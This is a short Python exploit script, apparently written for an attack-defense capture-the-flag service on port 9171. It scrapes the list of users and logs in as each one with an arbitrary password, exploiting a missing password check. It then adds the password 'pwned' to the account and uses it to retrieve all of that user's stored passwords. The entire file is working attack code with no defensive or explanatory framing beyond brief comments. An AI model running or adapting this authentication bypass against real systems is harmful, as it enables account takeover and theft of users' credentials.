#!/usr/bin/env python3

import re
import sys

import requests

ip = sys.argv[1]

r = requests.get(f'http://{ip}:9171/users/')
users = re.findall('href="/users/([^/]*)/"', r.text)
for user in users:
    print(f'Trying {user}')

    sess = requests.Session()

    # login as user with any password (password check missing)
    sess.post(f'http://{ip}:9171/login/', data={'username': user, 'password': 'anything'})

    # add a password to the user, now we know one of his passwords
    sess.post(f'http://{ip}:9171/add_password/', data={'password': 'pwned'})

    # send this password for checking and get all user passwords
    r = sess.post(f'http://{ip}:9171/users/{user}/', data={'password': 'pwned'})
    print(r.text, flush=True)
